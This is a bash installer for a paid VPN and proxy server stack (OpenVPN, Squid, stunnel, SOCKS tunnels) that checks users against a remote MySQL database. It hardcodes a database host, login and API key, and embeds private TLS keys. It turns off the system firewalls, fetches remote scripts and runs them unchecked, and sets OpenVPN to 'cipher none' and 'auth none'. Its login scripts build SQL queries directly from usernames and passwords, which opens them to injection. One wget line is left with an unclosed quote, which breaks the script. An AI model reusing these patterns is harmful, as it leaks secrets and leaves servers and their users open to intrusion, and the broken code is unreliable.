#!/bin/bash
#Script Variables
HOST='69.10.62.204';
USER='privateh5_privatehub';
PASS='privateh5_privatehub';
DBNAME='privateh5_privatehub';
PORT_TCP='1194';
PORT_UDP='110';
PORT_SSL='443';
OBFS='privatehub';
HYSTERIA_TYPE='default';
API_KEY='DexterEskalarte';

apt update
wget -O autodns "https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/autodns/autodns" && chmod +x autodns && sed -i -e 's/\r$//' ~/autodns && ./autodns

DOMAIN="$(cat /root/subdomain)"
NS="$(cat /root/ns.txt)"

timedatectl set-timezone Asia/Manila

if [[ $(grep "nogroup" /etc/group) ]]; then
    cert_group="nogroup"
fi

install_require () {
clear
echo 'Installing dependencies.'
{
# Turn off various firewalls
systemctl stop firewalld
systemctl disable firewalld
systemctl stop nftables
systemctl disable nftables
systemctl stop ufw
systemctl disable ufw
  
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export DEBIAN_FRONTEND=noninteractive
apt update
apt install -y lsof tar systemd dbus git
apt install -y gnupg2 ca-certificates lsb-release debian-archive-keyring socat
apt install -y curl wget cron python-minimal libpython-stdlib
apt install -y iptables sudo
apt install -y openvpn netcat httpie php neofetch vnstat
apt install -y screen squid stunnel4 dropbear gnutls-bin python
apt install -y dos2unix nano unzip jq virt-what net-tools default-mysql-client
apt install -y mlocate dh-make libaudit-dev build-essential fail2ban

touch /var/spool/cron/crontabs/root && chmod 600 /var/spool/cron/crontabs/root
systemctl start cron && systemctl enable cron

# Prevent the default bin directory of xray in some systems from missing
mkdir /usr/local/bin >/dev/null 2>&1
mkdir /usr/local/var >/dev/null 2>&1
mkdir /usr/local/var/run >/dev/null 2>&1
mkdir -m 777 /root/.web
clear
}&>/dev/null
clear
}

install_squid(){
clear
echo 'Installing proxy.'
{
sudo cp /etc/apt/sources.list /etc/apt/sources.list_backup
echo "deb http://ftp.debian.org/debian/ jessie main contrib non-free
    deb-src http://ftp.debian.org/debian/ jessie main contrib non-free
    deb http://security.debian.org/ jessie/updates main contrib
    deb-src http://security.debian.org/ jessie/updates main contrib
    deb http://ftp.debian.org/debian/ jessie-updates main contrib non-free
    deb-src http://ftp.debian.org/debian/ jessie-updates main contrib non-free" >> /etc/apt/sources.list
    apt update
    apt install -y gcc-4.9 g++-4.9
    update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-4.9 10
    update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-4.9 10
    update-alternatives --install /usr/bin/cc cc /usr/bin/gcc 30
    update-alternatives --set cc /usr/bin/gcc
    update-alternatives --install /usr/bin/c++ c++ /usr/bin/g++ 30
    update-alternatives --set c++ /usr/bin/g++
    cd /usr/src
    wget https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/proxy/squid-3.1.23.tar.gz
    tar zxvf squid-3.1.23.tar.gz
    cd squid-3.1.23
    ./configure --prefix=/usr \
      --localstatedir=/var/squid \
      --libexecdir=/usr/lib/squid \
      --srcdir=. \
      --datadir=/usr/share/squid \
      --sysconfdir=/etc/squid \
      --with-default-user=proxy \
      --with-logdir=/var/log/squid \
      --with-pidfile=/var/run/squid.pid
    make -j$(nproc)
    make install
    wget --no-check-certificate -O /etc/init.d/squid https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/proxy/squid.sh
    chmod +x /etc/init.d/squid
    update-rc.d squid defaults
    chown -cR proxy /var/log/squid
    squid -z
    cd /etc/squid/
    rm squid.conf
    echo "acl Firenet dst `curl -s https://api.ipify.org`" >> squid.conf
    echo 'http_port 8080
http_port 8181
visible_hostname Proxy
acl PURGE method PURGE
acl HEAD method HEAD
acl POST method POST
acl GET method GET
acl CONNECT method CONNECT
http_access allow Firenet
http_reply_access allow all
http_access deny all
icp_access allow all
always_direct allow all
visible_hostname Dexter-Proxy
error_directory /usr/share/squid/errors/English' >> squid.conf
    cd /usr/share/squid/errors/English
    rm ERR_INVALID_URL
    echo '<!--FirenetDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
    chmod 755 *
    /etc/init.d/squid start
cd /etc || exit
wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/socks/socks.py' -O /etc/socks.py
dos2unix /etc/socks.py
chmod +x /etc/socks.py

wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/socks/socks-ssh.py' -O /etc/socks-ssh.py
dos2unix /etc/socks-ssh.py
chmod +x /etc/socks-ssh.py

wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/websocket/socks-ws-ssh.py
dos2unix /etc/socks-ws-ssh.py
chmod +x /etc/socks-ws-ssh.py

wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/websocket/socks-ws-ssl.py' -O /etc/socks-ws-ssl.py
dos2unix /etc/socks-ws-ssl.py
chmod +x /etc/socks-ws-ssl.py

wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/repo/monitorz' -O /etc/.monitor
wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/websocket/ws' -O /etc/.ws
wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/repo/hysteria' -O /etc/.hysteria
chmod +x /etc/.monitor
chmod +x /etc/.ws
chmod +x /etc/.hysteria
rm /etc/apt/sources.list
sudo cp /etc/apt/sources.list_backup /etc/apt/sources.list
} &>/dev/null
}

#====================================================
#	Installing OpenVPN
#	Finalized: Firenet Developer
#====================================================

install_openvpn()
{
clear
echo "Installing openvpn."
{
mkdir -p /etc/openvpn/easy-rsa/keys
mkdir -p /etc/openvpn/login
mkdir -p /etc/openvpn/server
mkdir -p /var/www/html/stat
touch /etc/openvpn/server.conf
touch /etc/openvpn/server2.conf

echo 'DNS=1.1.1.1
DNSStubListener=no' >> /etc/systemd/resolved.conf

echo '#Openvpn Configuration by MTK Developer :)
dev tun
port PORT_UDP
proto udp
server 10.10.0.0 255.255.0.0
ca /etc/openvpn/easy-rsa/keys/ca.crt
cert /etc/openvpn/easy-rsa/keys/server.crt
key /etc/openvpn/easy-rsa/keys/server.key
dh none
ncp-disable
tls-server
tls-version-min 1.2
tls-cipher TLS-ECDHE-RSA-WITH-AES-128-GCM-SHA256
cipher none
auth none
persist-key
persist-tun
ping-timer-rem
compress lz4-v2
keepalive 10 120
reneg-sec 86400
user nobody
group nogroup
client-to-client
duplicate-cn
username-as-common-name
verify-client-cert none
script-security 3
auth-user-pass-verify "/etc/openvpn/login/auth_vpn" via-env #
push "redirect-gateway def1 bypass-dhcp"
push "dhcp-option DNS 8.8.8.8"
push "dhcp-option DNS 8.8.4.4"
push "compress lz4-v2"
push "persist-key"
push "persist-tun"
client-connect /etc/openvpn/login/connect.sh
client-disconnect /etc/openvpn/login/disconnect.sh
log /etc/openvpn/server/udpserver.log
status /etc/openvpn/server/udpclient.log
status-version 2
verb 3' > /etc/openvpn/server.conf

sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/openvpn/server.conf

echo '#Openvpn Configuration by MTK Developer :)
dev tun
port PORT_TCP
proto tcp
server 10.20.0.0 255.255.0.0
ca /etc/openvpn/easy-rsa/keys/ca.crt
cert /etc/openvpn/easy-rsa/keys/server.crt
key /etc/openvpn/easy-rsa/keys/server.key
dh none
ncp-disable
tls-server
tls-version-min 1.2
tls-cipher TLS-ECDHE-RSA-WITH-AES-128-GCM-SHA256
cipher none
auth none
persist-key
persist-tun
ping-timer-rem
compress lz4-v2
keepalive 10 120
reneg-sec 86400
user nobody
group nogroup
client-to-client
duplicate-cn
username-as-common-name
verify-client-cert none
script-security 3
auth-user-pass-verify "/etc/openvpn/login/auth_vpn" via-env #
push "redirect-gateway def1 bypass-dhcp"
push "dhcp-option DNS 8.8.8.8"
push "dhcp-option DNS 8.8.4.4"
push "compress lz4-v2"
push "persist-key"
push "persist-tun"
client-connect /etc/openvpn/login/connect.sh
client-disconnect /etc/openvpn/login/disconnect.sh
log /etc/openvpn/server/tcpserver.log
status /etc/openvpn/server/tcpclient.log
status-version 2
verb 3' > /etc/openvpn/server2.conf

sed -i "s|PORT_TCP|$PORT_TCP|g" /etc/openvpn/server2.conf

cat <<\EOM >/etc/openvpn/login/config.sh
#!/bin/bash
HOST='DBHOST'
USER='DBUSER'
PASS='DBPASS'
DB='DBNAME'
EOM

sed -i "s|DBHOST|$HOST|g" /etc/openvpn/login/config.sh
sed -i "s|DBUSER|$USER|g" /etc/openvpn/login/config.sh
sed -i "s|DBPASS|$PASS|g" /etc/openvpn/login/config.sh
sed -i "s|DBNAME|$DBNAME|g" /etc/openvpn/login/config.sh

/bin/cat <<"EOM" >/etc/openvpn/login/auth_vpn
#!/bin/bash
. /etc/openvpn/login/config.sh
Query="SELECT user_name FROM users WHERE user_name='$username' AND auth_vpn=md5('$password') AND status='live' AND is_freeze=0 AND is_ban=0 AND (duration > 0 OR vip_duration > 0 OR private_duration > 0)"
user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
[ "$user_name" != '' ] && [ "$user_name" = "$username" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1
EOM

#client-connect file
cat <<'LENZ05' >/etc/openvpn/login/connect.sh
#!/bin/bash
. /etc/openvpn/login/config.sh
##set status online to user connected
server_ip=SERVER_IP
datenow=`date +"%Y-%m-%d %T"`
tm="$(date +%s)"
dt="$(date +'%Y-%m-%d %H:%M:%S')"
timestamp="$(date +'%FT%TZ')"

##set status online to user connected
bandwidth_check=`mysql -u $USER -p$PASS -D $DB -h $HOST --skip-column-name -e "SELECT bandwidth_logs.username FROM bandwidth_logs WHERE bandwidth_logs.username='$common_name' AND bandwidth_logs.status='online'"`
if [ "$bandwidth_check" == 1 ]; then
mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE bandwith_logs SET server_ip='$trusted_ip', server_port='$trusted_port', timestamp='$timestamp', ipaddress='$trusted_ip:$trusted_port', username='$common_name', time_in='$tm', since_connected='$time_ascii', bytes_received='$bytes_received', bytes_sent='$bytes_sent' WHERE username='$common_name' AND status='online' AND server_port='$trusted_port' "
mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='1', device_connected='1', active_address='$server_ip', active_date='$datenow' WHERE user_name='$common_name' "
else
mysql -u $USER -p$PASS -D $DB -h $HOST -e "INSERT INTO bandwidth_logs (server_ip, server_port, timestamp, ipaddress, since_connected, username, bytes_received, bytes_sent, time_in, status, time) VALUES ('$trusted_ip','$trusted_port','$timestamp','$trusted_ip:$trusted_port','$time_ascii','$common_name','$bytes_received','$bytes_sent','$dt','online','$tm') "
mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='1', device_connected='1', active_address='$server_ip', active_date='$datenow' WHERE user_name='$common_name' "
fi
LENZ05

sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/login/connect.sh

#TCP client-disconnect file
cat <<'LENZ06' >/etc/openvpn/login/disconnect.sh
#!/bin/bash
. /etc/openvpn/login/config.sh
server_ip=SERVER_IP
tm="$(date +%s)"
dt="$(date +'%Y-%m-%d %H:%M:%S')"
timestamp="$(date +'%FT%TZ')"

mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE bandwidth_logs SET bytes_received='$bytes_received',bytes_sent='$bytes_sent',time_out='$dt', status='offline' WHERE username='$common_name' AND status='online'"
mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='0', active_address='', active_date='' WHERE user_name='$common_name' "
LENZ06

sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/login/disconnect.sh

cat << EOF > /etc/openvpn/easy-rsa/keys/ca.crt
-----BEGIN CERTIFICATE-----
MIICMTCCAZqgAwIBAgIUAaQBApMS2dYBqYPcA3Pa7cjjw7cwDQYJKoZIhvcNAQEL
BQAwDzENMAsGA1UEAwwES29iWjAeFw0yMDA3MjIyMjIzMzNaFw0zMDA3MjAyMjIz
MzNaMA8xDTALBgNVBAMMBEtvYlowgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGB
AMF46UVi2O5pZpddOPyzU2EyIrr8NrpXqs8BlYhUjxOcCrkMjFu2G9hk7QIZ4qO0
GWVZpPhYk5qWk+LxCsryrSoe0a5HaqIye8BFJmXV0k+O/3e6k06UGNii3gxBWQpF
7r/2CyQLus9OSpQPYszByBvtkwiBAo/V98jdpm+EVu6tAgMBAAGjgYkwgYYwHQYD
VR0OBBYEFGRJMm/+ZmLxV027kahdvSY+UaTSMEoGA1UdIwRDMEGAFGRJMm/+ZmLx
V027kahdvSY+UaTSoROkETAPMQ0wCwYDVQQDDARLb2JaghQBpAECkxLZ1gGpg9wD
c9rtyOPDtzAMBgNVHRMEBTADAQH/MAsGA1UdDwQEAwIBBjANBgkqhkiG9w0BAQsF
AAOBgQC0f8wb5hyEOEEX64l8QCNpyd/WLjoeE5bE+xnIcKE+XpEoDRZwugLoyQdc
HKa3aRHNqKpR7H696XJReo4+pocDeyj7rATbO5dZmSMNmMzbsjQeXux0XjwmZIHu
eDKMefDi0ZfiZmnU2njmTncyZKxv18Ikjws0Myc8PtAxy2qdcA==
-----END CERTIFICATE-----
EOF

cat << EOF > /etc/openvpn/easy-rsa/keys/server.crt
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            40:26:da:91:18:2b:77:9c:85:6a:0c:bb:ca:90:53:fe
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=tigercore vpn
        Validity
            Not Before: Jul 22 22:23:55 2020 GMT
            Not After : Jul 20 22:23:55 2030 GMT
        Subject: CN=server
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (1024 bit)
                Modulus:
                    00:ce:35:23:d8:5d:9f:b6:9b:cb:6a:89:e1:90:af:
                    42:df:5f:f8:bd:ad:a7:78:9a:ca:20:f0:3d:5b:d6:
                    c9:ef:4c:4a:99:96:c3:38:fd:59:b4:d7:65:ed:d4:
                    a7:fa:ab:03:e2:be:88:2f:ca:fc:90:dd:b0:b7:bc:
                    23:cb:83:ac:36:e2:01:57:69:64:b8:e1:9e:51:f0:
                    a6:9d:13:d9:92:6b:4d:04:a6:10:64:a3:3f:6b:ff:
                    fe:32:ac:91:63:c2:71:24:be:9e:76:4f:87:cc:3a:
                    03:a1:9e:48:3f:11:92:33:3b:19:16:9c:d0:5d:16:
                    ee:c1:42:67:99:47:66:67:67
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Subject Key Identifier: 
                6B:08:C0:64:10:71:A8:32:7F:0B:FE:1E:98:1F:BD:72:74:0F:C8:66
            X509v3 Authority Key Identifier: 
                keyid:64:49:32:6F:FE:66:62:F1:57:4D:BB:91:A8:5D:BD:26:3E:51:A4:D2
                DirName:/CN=tigercore vpn
                serial:01:A4:01:02:93:12:D9:D6:01:A9:83:DC:03:73:DA:ED:C8:E3:C3:B7
            X509v3 Extended Key Usage: 
                TLS Web Server Authentication
            X509v3 Key Usage: 
                Digital Signature, Key Encipherment
            X509v3 Subject Alternative Name: 
                DNS:server
    Signature Algorithm: sha256WithRSAEncryption
         a1:3e:ac:83:0b:e5:5d:ca:36:b7:d0:ab:d0:d9:73:66:d1:62:
         88:ce:3d:47:9e:08:0b:a0:5b:51:13:fc:7e:d7:6e:17:0e:bd:
         f5:d9:a9:d9:06:78:52:88:5a:e5:df:d3:32:22:4a:4b:08:6f:
         b1:22:80:4f:19:d1:5f:9d:b6:5a:17:f7:ad:70:a9:04:00:ff:
         fe:84:aa:e1:cb:0e:74:c0:1a:75:0b:3e:98:90:1d:22:ba:a4:
         7a:26:65:7d:d1:3b:5c:45:a1:77:22:ed:b6:6b:18:a3:c4:ee:
         3e:06:bb:0b:ec:12:ac:16:a5:50:b3:ed:46:43:87:72:fd:75:
         8c:38
-----BEGIN CERTIFICATE-----
MIICVDCCAb2gAwIBAgIQQCbakRgrd5yFagy7ypBT/jANBgkqhkiG9w0BAQsFADAP
MQ0wCwYDVQQDDARLb2JaMB4XDTIwMDcyMjIyMjM1NVoXDTMwMDcyMDIyMjM1NVow
ETEPMA0GA1UEAwwGc2VydmVyMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDO
NSPYXZ+2m8tqieGQr0LfX/i9rad4msog8D1b1snvTEqZlsM4/Vm012Xt1Kf6qwPi
vogvyvyQ3bC3vCPLg6w24gFXaWS44Z5R8KadE9mSa00EphBkoz9r//4yrJFjwnEk
vp52T4fMOgOhnkg/EZIzOxkWnNBdFu7BQmeZR2ZnZwIDAQABo4GuMIGrMAkGA1Ud
EwQCMAAwHQYDVR0OBBYEFGsIwGQQcagyfwv+HpgfvXJ0D8hmMEoGA1UdIwRDMEGA
FGRJMm/+ZmLxV027kahdvSY+UaTSoROkETAPMQ0wCwYDVQQDDARLb2JaghQBpAEC
kxLZ1gGpg9wDc9rtyOPDtzATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMC
BaAwEQYDVR0RBAowCIIGc2VydmVyMA0GCSqGSIb3DQEBCwUAA4GBAKE+rIML5V3K
NrfQq9DZc2bRYojOPUeeCAugW1ET/H7XbhcOvfXZqdkGeFKIWuXf0zIiSksIb7Ei
gE8Z0V+dtloX961wqQQA//6EquHLDnTAGnULPpiQHSK6pHomZX3RO1xFoXci7bZr
GKPE7j4GuwvsEqwWpVCz7UZDh3L9dYw4
-----END CERTIFICATE-----
EOF

cat << EOF > /etc/openvpn/easy-rsa/keys/server.key
-----BEGIN PRIVATE KEY-----
MIICdQIBADANBgkqhkiG9w0BAQEFAASCAl8wggJbAgEAAoGBAM41I9hdn7aby2qJ
4ZCvQt9f+L2tp3iayiDwPVvWye9MSpmWwzj9WbTXZe3Up/qrA+K+iC/K/JDdsLe8
I8uDrDbiAVdpZLjhnlHwpp0T2ZJrTQSmEGSjP2v//jKskWPCcSS+nnZPh8w6A6Ge
SD8RkjM7GRac0F0W7sFCZ5lHZmdnAgMBAAECgYAFNrC+UresDUpaWjwaxWOidDG8
0fwu/3Lm3Ewg21BlvX8RXQ94jGdNPDj2h27r1pEVlY2p767tFr3WF2qsRZsACJpI
qO1BaSbmhek6H++Fw3M4Y/YY+JD+t1eEBjJMa+DR5i8Vx3AE8XOdTXmkl/xK4jaB
EmLYA7POyK+xaDCeEQJBAPJadiYd3k9OeOaOMIX+StCs9OIMniRz+090AJZK4CMd
jiOJv0mbRy945D/TkcqoFhhScrke9qhgZbgFj11VbDkCQQDZ0aKBPiZdvDMjx8WE
y7jaltEDINTCxzmjEBZSeqNr14/2PG0X4GkBL6AAOLjEYgXiIvwfpoYE6IIWl3re
ebCfAkAHxPimrixzVGux0HsjwIw7dl//YzIqrwEugeSG7O2Ukpz87KySOoUks3Z1
yV2SJqNWskX1Q1Xa/gQkyyDWeCeZAkAbyDBI+ctc8082hhl8WZunTcs08fARM+X3
FWszc+76J1F2X7iubfIWs6Ndw95VNgd4E2xDATNg1uMYzJNgYvcTAkBoE8o3rKkp
em2n0WtGh6uXI9IC29tTQGr3jtxLckN/l9KsJ4gabbeKNoes74zdena1tRdfGqUG
JQbf7qSE3mg2
-----END PRIVATE KEY-----
EOF

cat << EOF > /etc/openvpn/easy-rsa/keys/dh.pem
-----BEGIN DH PARAMETERS-----
MIIBCAKCAQEA8MUwUyMPJw5khx6y9yI9DoZpq0bFaLP0aLPTGI7AeDBnaukqa4vW
TXUW5yfvgMkCuWfq2KPc/z1Ck92hhE37EOT3tovVrbWUfNVtDWl1z69JYduznvW1
iDddNmeTiWLiTPhm63HbeZD61pBqMPQRz4DokPwkSok/BlzzRfAOH1NGFmmBrs/B
afVpyVA2mO4SxiWznAj/KZLtL6IyT/GPfZLR4umQ1Lz82zO80HPfHQ7UtDSdbjyM
sndH7WSvxv6+D/cCO1/bGArnpExdTcR4WmaF0ebPDJ9cilXmz+hcGAmcnBj5qP5U
dbCSvBgUDBm+DjlBZzoVSeHtIe/jPj38MwIBAg==
-----END DH PARAMETERS-----
EOF

dos2unix /etc/openvpn/login/auth_vpn
dos2unix /etc/openvpn/login/connect.sh
dos2unix /etc/openvpn/login/disconnect.sh

chmod 777 -R /etc/openvpn/
chmod 755 /etc/openvpn/server.conf
chmod 755 /etc/openvpn/server2.conf
chmod 755 /etc/openvpn/login/connect.sh
chmod 755 /etc/openvpn/login/disconnect.sh
chmod 755 /etc/openvpn/login/config.sh
chmod 755 /etc/openvpn/login/auth_vpn
}&>/dev/null
}

install_firewall_kvm () {
clear
echo "Installing iptables."
echo "net.ipv4.ip_forward=1
net.ipv4.conf.all.rp_filter=0
net.ipv4.conf."$server_interface".rp_filter=0" >> /etc/sysctl.conf
sysctl -p
{
iptables -F
iptables -t nat -A PREROUTING -i "$server_interface" -p udp -m udp --dport 10000:50000 -j DNAT --to-destination :5666
iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o "$server_interface" -j MASQUERADE
iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o "$server_interface" -j SNAT --to-source "$server_ip"
iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o "$server_interface" -j MASQUERADE
iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o "$server_interface" -j SNAT --to-source "$server_ip"
iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 --name DEFAULT --mask 255.255.255.255 --rsource -j DROP
iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --set --name DEFAULT --mask 255.255.255.255 --rsource
sudo iptables -I INPUT -p udp --dport 5300 -j ACCEPT &>/dev/null;
sudo iptables -t nat -I PREROUTING -i $(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ") -p udp --dport 53 -j REDIRECT --to-ports 5300 &>/dev/null;
sudo ip6tables -I INPUT -p udp --dport 5300 -j ACCEPT &>/dev/null;
sudo ip6tables -t nat -I PREROUTING -i $(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ") -p udp --dport 53 -j REDIRECT --to-ports 5300 &>/dev/null;
echo iptables-persistent iptables-persistent/autosave_v4 boolean true | sudo debconf-set-selections
echo iptables-persistent iptables-persistent/autosave_v6 boolean true | sudo debconf-set-selections
sudo apt -y install iptables-persistent
iptables-save > /etc/iptables_rules.v4
ip6tables-save > /etc/iptables_rules.v6

# Maximum number of open files
sed -i '/^\*\ *soft\ *nofile\ *[[:digit:]]*/d' /etc/security/limits.conf
sed -i '/^\*\ *hard\ *nofile\ *[[:digit:]]*/d' /etc/security/limits.conf
echo '* soft nofile 65536' >>/etc/security/limits.conf
echo '* hard nofile 65536' >>/etc/security/limits.conf
}&>/dev/null
}

install_stunnel() {
  {
cd /etc/stunnel/ || exit

echo "-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClmgCdm7RB2VWK
wfH8HO/T9bxEddWDsB3fJKpM/tiVMt4s/WMdGJtFdRlxzUb03u+HT6t00sLlZ78g
ngjxLpJGFpHAGdVf9vACBtrxv5qcrG5gd8k7MJ+FtMTcjeQm8kVRyIW7cOWxlpGY
6jringYZ6NcRTrh/OlxIHKdsLI9ddcekbYGyZVTm1wd22HVG+07PH/AeyY78O2+Z
tbjxGTFRSYt3jUaFeUmWNtxqWnR4MPmC+6iKvUKisV27P89g8v8CiZynAAWRJ0+A
qp+PWxwHi/iJ501WdLspeo8VkXIb3PivyIKC356m+yuuibD2uqwLZ2//afup84Qu
pRtgW/PbAgMBAAECggEAVo/efIQUQEtrlIF2jRNPJZuQ0rRJbHGV27tdrauU6MBT
NG8q7N2c5DymlT75NSyHRlKVzBYTPDjzxgf1oqR2X16Sxzh5uZTpthWBQtal6fmU
JKbYsDDlYc2xDZy5wsXnCC3qAaWs2xxadPUS3Lw/cjGsoeZlOFP4QtV/imLseaws
7r4KZE7SVO8dF8Xtcy304Bd7UsKClnbCrGsABUF/rqA8g34o7yrpo9XqcwbF5ihQ
TbnB0Ns8Bz30pjgGjJZTdTL3eskP9qMJWo/JM76kSaJWReoXTws4DlQHxO29z3eK
zKdxieXaBGMwFnv23JvXKJ5eAnxzqsL6a+SuNPPN4QKBgQDQhisSDdjUJWy0DLnJ
/HjtsnQyfl0efOqAlUEir8r5IdzDTtAEcW6GwPj1rIOm79ZeyysT1pGN6eulzS1i
6lz6/c5uHA9Z+7LT48ZaQjmKF06ItdfHI9ytoXaaQPMqW7NnyOFxCcTHBabmwQ+E
QZDFkM6vVXL37Sz4JyxuIwCNMQKBgQDLThgKi+L3ps7y1dWayj+Z0tutK2JGDww7
6Ze6lD5gmRAURd0crIF8IEQMpvKlxQwkhqR4vEsdkiFFJQAaD+qZ9XQOkWSGXvKP
A/yzk0Xu3qL29ZqX+3CYVjkDbtVOLQC9TBG60IFZW79K/Zp6PhHkO8w6l+CBR+yR
X4+8x1ReywKBgQCfSg52wSski94pABugh4OdGBgZRlw94PCF/v390En92/c3Hupa
qofi2mCT0w/Sox2f1hV3Fw6jWNDRHBYSnLMgbGeXx0mW1GX75OBtrG8l5L3yQu6t
SeDWpiPim8DlV52Jp3NHlU3DNrcTSOFgh3Fe6kpot56Wc5BJlCsliwlt0QKBgEol
u0LtbePgpI2QS41ewf96FcB8mCTxDAc11K6prm5QpLqgGFqC197LbcYnhUvMJ/eS
W53lHog0aYnsSrM2pttr194QTNds/Y4HaDyeM91AubLUNIPFonUMzVJhM86FP0XK
3pSBwwsyGPxirdpzlNbmsD+WcLz13GPQtH2nPTAtAoGAVloDEEjfj5gnZzEWTK5k
4oYWGlwySfcfbt8EnkY+B77UVeZxWnxpVC9PhsPNI1MTNET+CRqxNZzxWo3jVuz1
HtKSizJpaYQ6iarP4EvUdFxHBzjHX6WLahTgUq90YNaxQbXz51ARpid8sFbz1f37
jgjgxgxbitApzno0E2Pq/Kg=
-----END PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIDRTCCAi2gAwIBAgIUOvs3vdjcBtCLww52CggSlAKafDkwDQYJKoZIhvcNAQEL
BQAwMjEQMA4GA1UEAwwHS29ielZQTjERMA8GA1UECgwIS29iZUtvYnoxCzAJBgNV
BAYTAlBIMB4XDTIxMDcwNzA1MzQwN1oXDTMxMDcwNTA1MzQwN1owMjEQMA4GA1UE
AwwHS29ielZQTjERMA8GA1UECgwIS29iZUtvYnoxCzAJBgNVBAYTAlBIMIIBIjAN
BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApZoAnZu0QdlVisHx/Bzv0/W8RHXV
g7Ad3ySqTP7YlTLeLP1jHRibRXUZcc1G9N7vh0+rdNLC5We/IJ4I8S6SRhaRwBnV
X/bwAgba8b+anKxuYHfJOzCfhbTE3I3kJvJFUciFu3DlsZaRmOo64p4GGejXEU64
fzpcSBynbCyPXXXHpG2BsmVU5tcHdth1RvtOzx/wHsmO/DtvmbW48RkxUUmLd41G
hXlJljbcalp0eDD5gvuoir1CorFduz/PYPL/AomcpwAFkSdPgKqfj1scB4v4iedN
VnS7KXqPFZFyG9z4r8iCgt+epvsrromw9rqsC2dv/2n7qfOELqUbYFvz2wIDAQAB
o1MwUTAdBgNVHQ4EFgQUcKFL6tckon2uS3xGrpe1Zpa68VEwHwYDVR0jBBgwFoAU
cKFL6tckon2uS3xGrpe1Zpa68VEwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0B
AQsFAAOCAQEAYQP0S67eoJWpAMavayS7NjK+6KMJtlmL8eot/3RKPLleOjEuCdLY
QvrP0Tl3M5gGt+I6WO7r+HKT2PuCN8BshIob8OGAEkuQ/YKEg9QyvmSm2XbPVBaG
RRFjvxFyeL4gtDlqb9hea62tep7+gCkeiccyp8+lmnS32rRtFa7PovmK5pUjkDOr
dpvCQlKoCRjZ/+OfUaanzYQSDrxdTSN8RtJhCZtd45QbxEXzHTEaICXLuXL6cmv7
tMuhgUoefS17gv1jqj/C9+6ogMVa+U7QqOvL5A7hbevHdF/k/TMn+qx4UdhrbL5Q
enL3UGT+BhRAPiA1I5CcG29RqjCzQoaCNg==
-----END CERTIFICATE-----" >> stunnel.pem

echo "debug = 0
output = /tmp/stunnel.log
cert = /etc/stunnel/stunnel.pem

[openvpn-tcp]
connect = PORT_TCP  
accept = PORT_SSL 

[openvpn-udp]
connect = PORT_UDP
accept = 444

[ssh]
connect = 22
accept = 445

[dropbear]
connect = 442
accept = 446

" >> stunnel.conf

sed -i "s|PORT_TCP|$PORT_TCP|g" /etc/stunnel/stunnel.conf
sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/stunnel/stunnel.conf
sed -i "s|PORT_SSL|$PORT_SSL|g" /etc/stunnel/stunnel.conf
